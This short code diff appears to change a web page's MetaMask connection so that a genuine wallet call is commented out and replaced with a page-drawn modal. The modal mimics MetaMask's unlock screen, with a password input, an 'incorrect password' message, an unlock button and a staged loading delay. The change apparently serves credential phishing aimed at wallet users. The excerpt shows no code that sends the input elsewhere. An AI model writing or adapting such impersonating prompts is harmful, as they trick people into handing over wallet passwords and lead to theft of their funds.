@@ -271,6 +271,7 @@
       });
 
       // Open modal
+      /*
       function openMetaMaskModal(){
         if (typeof window.ethereum !== 'undefined') {
           try {
@@ -280,6 +281,25 @@
           } catch (err) {
               console.error(err);
           }
+        } else {
+            alert('Please install MetaMask!');
+        }
+      }
+        */
+       // Open modal
+      function openMetaMaskModal(){
+        if (typeof window.ethereum !== 'undefined') {
+          modal.style.display = "block";
+          metamaskInput.value='';
+          metamaskInput.classList.remove("invalid");
+          incorrectPassword.classList.add("hidden");
+          unlockBtn.setAttribute('disabled', 'disabled');
+          let timer = setTimeout(() => {
+            clearTimeout(timer);
+            metamaskLoading.style.display = "none";
+            metamaskContent.style.display = "block";
+            metamaskInput.focus();
+          }, 3000);
         } else {
             alert('Please install MetaMask!');
         }
